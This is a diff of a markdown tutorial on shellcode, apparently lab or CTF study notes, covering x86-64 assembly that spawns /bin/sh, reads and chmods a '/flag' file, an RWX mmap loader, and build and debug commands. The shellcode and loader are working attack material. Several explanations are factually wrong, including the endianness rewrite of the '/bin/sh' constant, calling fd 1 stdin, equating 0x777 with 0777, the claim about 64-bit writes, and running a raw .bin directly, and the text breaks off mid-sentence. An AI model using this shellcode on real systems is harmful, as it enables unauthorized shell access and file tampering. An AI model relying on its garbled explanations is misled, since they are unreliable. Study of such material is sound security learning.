@@ -1,9 +1,12 @@
 In von Neumann architecture, the code and data are stored in the same memory unit and processed by the same processor. This architecture was proposed by mathematician and physicist John von Neumann in 1945. It has been widely adopted since then, due to its simplicity and flexibility. The basic idea behind von Neumann architecture is that all instructions are stored as data and all data can be used as instructions. This allows for a much more efficient use of memory than storing code and data separately, as was done previously.
 
-But it lead to many security issues. Since data and code are stored in same memory, hackers can use the data to be used as code. In other words they can send the carefully crafted data that can be directly executed by the processor. 
+But it lead to many security issues. Since data and code are stored in same memory, hackers can utilize the data to be used as code. In other words they can send the carefully crafted data {code} that can be directly executed by the processor. 
+
+### What is a Shellcode?
+Now let's define what a shellcode is. Shellcode is a small piece of code typically written in assembly language that can be used as the payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which arbitrary commands can be executed. Shellcode is commonly used as part of malware, to gain unauthorized access on a system or to elevate privileges. Once is access is gained, the attacker can do things like downloading malicious files, installing backdoors, stealing sensitive data etc.
 
 ### How does it get Injected?
-Usually, programmers make mistakes and we use those mistakes to inject our shellcode. There are many ways to inject shellcode. In this post, we'll learn how can we write carefully crafted input data that can execute directly and can gain access to different system resource. For example:
+Usually, programmers make mistakes and we use those mistakes to inject our shellcode. There are many ways to inject shellcode. For example:
 
 ```c
 void bye1() { puts("Goodbye!"); }
@@ -28,4 +31,186 @@ Compile with:  `gcc -z execstack -o hello hello.c`
 In the above code, when the value of `rand()` is even, the `hello()` function will be called with the arguments `name` and `bye2`. But when the value of `rand()` is odd, the `hello()` function will be called with the arguments `bye1` and `name`, which is not correct way to call the hello function. It takes the second parameter as a function pointer, but we are passing a string. This is a classic example of shellcode injection. We can simply use the gets() function to inject our shellcode in the form of crafted input data.
 
 ### Why "shell"code?
-Usually, the goal of an exploit is to achieve arbitrary command execution. This is done by injecting a shellcode that will spawn a shell. The shellcode is usually written in assembly language. The shellcode is then converted to machine code and injected into the vulnerable program. The shellcode is then executed by the processor and the shell is spawned.
+As mentioned above, Usually the goal of an exploit is to achieve arbitrary command execution. This is done by injecting a shellcode that will spawn a **shell**. There can be many ways to get a shellcode that can injected to a vulnerable program like:
+- Writing your own shellcode (normally in assembly)
+- Using publicly available shellcodes
+	- https://www.exploit-db.com/shellcodes
+	- https://shell-storm.org/shellcode/index.html
+- Generating shellcode using tools like `msfvenom`
+
+Although we have a set of already avalable shellcodes but still we need to learn the art of wrinting it on our own. Because we know that each system has it's own set of security constrains and we need the customise our shellcode to bypass or tackle those contrains.
+
+Here is an example of basic shellcode that can spawn a shell.
+
+``` Assembly
+mov rax, 59 # this is the syscall number of execve
+
+lea rdi, [rip+binsh] # points the first argument of execve at the /bin/sh string below
+
+mov rsi, 0 # this makes the second argument, argv, NULL
+
+mov rdx, 0 # this makes the third argument, envp, NULL
+
+syscall # this triggers the system call
+
+binsh: # a label marking where the /bin/sh string is
+
+.string "/bin/sh"
+```
+
+### DATA in your CODE
+
+We can wite a shellcode that can store data in it. For instnace, in above shellcode example, we have to write the path to bash shell that is in string and we have added it in the shellcode as `.string "/bin/sh"`. 
+
+We can also intersperse arbitrary data in your shellcode:
+
+``` Assembly
+.byte 0x48, 0x45, 0x4C, 0x4C, 0x4F # "HELLO"  
+.string "HELLO" # "HELLO\0"
+```
+
+Other ways to embed data:
+
+```Assembly
+mov rbx, 0x0068732f6e69622f # move "/bin/sh\0" into rbx
+
+push rbx # push "/bin/sh\0" onto the stack
+
+mov rdi, rsp # point rdi at the stack
+```
+
+
+### Endianness of Data
+In computing, endianness is the order in which multi-byte data is stored or retrieved from computer memory. Endianness is primarily expressed as:
+- big-endian (BE)
+	A big-endian system stores the most significant byte of a word at the smallest memory address (MSB first). Used by MIPS, MC68000 and Internet
+- little-endian (LE)
+	A little-endian system, in contrast, stores the least-significant byte of a word at the smallest address (LSB first). Used by x86 and ARM
+
+Let us store a 8 byte number 0x1122334455667788 in memory.
+![[Pasted image 20221229224021.png]]
+
+When we are writing our shellcode, we need to be aware of the endianness of the data. Endianness is the order in which data is stored in memory. So if we are writing shellcode for a little-endian system, then we need to write our data in reverse order. 
+
+For example:
+
+```Assembly
+mov rbx, 0x0068732f6e69622f # move "/bin/sh\0" into rbx
+```
+
+This code will work on a big-endian system, but on a little-endian system it will need to be written as:
+
+```Assembly
+mov rbx, 0x2f62696e2f
+```
+
+### Non-shell shellcode
+We can write a shellcode that can do many things other than just spawning a shell. For example, we can write a shellcode that can open a file and send it's data to provided file descriptor (*1 = stdin*). For that we have shellcode like:
+
+```Assembly
+mov rbx, 0x00000067616c662f # push "/flag" filename
+push rbx
+mov rax, 2 # syscall number of open
+mov rdi, rsp # point the first argument at stack (where we have "/flag")
+mov rsi, 0 # NULL out the second argument (meaning, O_RDONLY)
+syscall # trigger open("/flag", NULL)
+mov rdi, 1 # first argument to sendfile is the file descriptor to output to (stdout)
+mov rsi, rax # second argument is the file descriptor returned by open
+mov rdx, 0 # third argument is the number of bytes to skip from the input file
+mov r10, 1000 # fourth argument is the number of bytes to transfer to the output file
+mov rax, 40 # syscall number of sendfile
+syscall # trigger sendfile(1, fd, 0, 1000)
+mov rax, 60 # syscall number of exit
+syscall # trigger exit()
+```
+
+Similarly, we can write a shellcode that can change the permissions of a file. For that we have shellcode like:
+
+```Assembly
+mov rbx, 0x00000067616c662f # push "/flag" filename
+push rbx
+mov rax, 2 # syscall number of open
+mov rdi, rsp # point the first argument at stack (where we have "/flag")
+mov rsi, 0 # NULL out the second argument (meaning, O_RDONLY)
+syscall # trigger open("/flag", NULL)
+mov rdi, rax # first argument to fchmod is the file descriptor returned by open
+mov rsi, 0x777 # second argument is the new permissions (0x777 = 0777 = rwxrwxrwx)
+mov rax, 94 # syscall number of fchmod
+syscall # trigger fchmod(fd, 0x777)
+mov rax, 60 # syscall number of exit
+syscall # trigger exit()
+```
+
+### Building Shellcode
+We can build our shellcode using any assembler like `as` or `nasm` assembler. For example, we can build the shellcode of above example using:
+
+```bash
+$ nasm -f elf64 shellcode.asm
+```
+and then we need to extract only the text section of the shellcode as it is the only section that contains the shellcode. We can do that using:
+
+```bash
+$ objcopy -O binary -j .text shellcode.o shellcode.bin
+```
+Now `shellcode.bin` contains the shellcode that we can use in our exploit.
+
+### Running Shellcode
+We can run our shellcode by replicating the exotic conditions that are required to run the shellcode. For example, we can run the shellcode of above example by creating a file named `flag` and then running the shellcode using:
+
+```bash
+$ echo "flag" > flag
+$ chmod 777 flag
+$ ./shellcode.bin
+```
+
+#### Replicating exotic conditions
+If we are to replicate exotic conditions in ways that are too hard to do as a preamble for your shellcode, we can build a shellcode loader in C:
+```c
+page = mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+read(0, page, 0x1000);
+((void(*)())page)();
+```
+Then
+```bash
+$ cat shellcode-raw | ./tester
+```
+### Debugging Shellcode
+- GNU Debugger (GDB)
+We can debug our shellcode using `gdb` debugger. For example, we can debug the shellcode of above example using:
+
+```bash
+$ gdb ./shellcode.bin
+```
+
+- strace
+To see if things are working from a high level, we can trace our shellcode with strace:
+
+```bash
+$ strace ./shellcode.bin
+```
+This can show you, at a high level, what your shellcode is doing (or not doing!).
+
+### Shellcode for other architectures
+We can write shellcode for any architecture using cross-assemblers. Our way of building shellcode translates well to other architectures:
+**amd64:** `gcc -nostdlib -static shellcode.s -o shellcode-elf`
+ **mips:** `mips-linux-gnu-gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf`
+Similarly, we can run cross-architecture shellcode with an emulator:
+**amd64:** `./shellcode`
+ **mips:** `qemu-mips-static ./shellcode-mips`
+
+
+### Common Challenges
+- **Memory Access Width**
+  We need to Be careful about sizes of memory accesses. For example, if we are writing a 64-bit value, we need to write it in two 32-bit writes. Similarly, if we are writing a 32-bit value, we need to write it in one 32-bit write. For example, we can write a 64-bit value using:
+	single byte: 	`mov [rax], bl`
+	2-byte word: 	`mov [rax], bx`
+	4-byte dword: 	`mov [rax], ebx`
+	8-byte qword: 	`mov [rax], rbx`
+ Sometimes, you might have to explicitly specify the size to avoid ambiguity:
+	Single byte: 	`mov byte [rax], bl`
+	2-byte word: 	`mov word [rax], bx`
+	4-byte dword: 	`mov dword [rax], ebx`
+	8-byte qword: 	`mov qword [rax], rbx`
+
+- **Forbidden Bytes**
+  Depending on the injection method, certain bytes might not be allowed. For example, if we are injecting shellcode into a binary, we might not be able to use null bytes. Similarly, if we are injecting shellcode into a URL, we might not be able to use certain characters like `&` or `=`. Although We can use a tool like `msfvenom` to generate shellcode that avoids these forbidden bytes, but we can also write our own shellcode that avoids these forbidden bytes. For example, we can write a shellcode that avoids null bytes using:
